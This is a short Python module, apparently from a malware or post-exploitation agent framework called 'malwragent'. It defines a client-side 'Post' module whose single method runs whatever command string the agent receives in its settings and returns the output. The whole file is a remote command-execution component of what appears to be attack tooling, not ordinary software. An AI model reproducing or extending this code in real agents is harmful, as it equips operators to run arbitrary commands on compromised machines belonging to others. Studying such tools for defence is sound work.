# -*- coding: utf-8 -*-
"""the command module provides methods for command execution"""
from __future__ import absolute_import

import shlex
import subprocess

from malwragent.packages.helpers.agentmodule import AgentModule
from malwragent.packages.helpers.agentmodule import Decorators

__class_name__ = 'Command'
__client_mode__ = True
__server_mode__ = False
__module_type__ = 'Post'


class Command(AgentModule):
    """provide command execution routines"""

    @Decorators.args(None)
    def f_exec_system(self):
        """execute a command"""
        cli_and_args = shlex.split(self.settings['input'])
        process = subprocess.Popen(cli_and_args, stdout=subprocess.PIPE)
        return process.stdout.read().strip()
